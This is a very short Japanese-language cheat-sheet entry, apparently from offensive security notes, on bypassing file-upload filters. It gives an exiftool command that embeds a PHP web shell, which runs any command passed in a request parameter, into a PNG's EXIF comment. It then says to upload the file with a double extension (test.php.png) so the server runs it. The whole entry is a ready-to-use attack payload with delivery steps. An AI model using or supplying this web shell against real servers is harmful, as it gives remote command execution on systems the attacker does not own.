# Other technic

## exif情報
exifに埋め込む

```
$ exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' test.png
```

これでtest.php.pngとしてupload
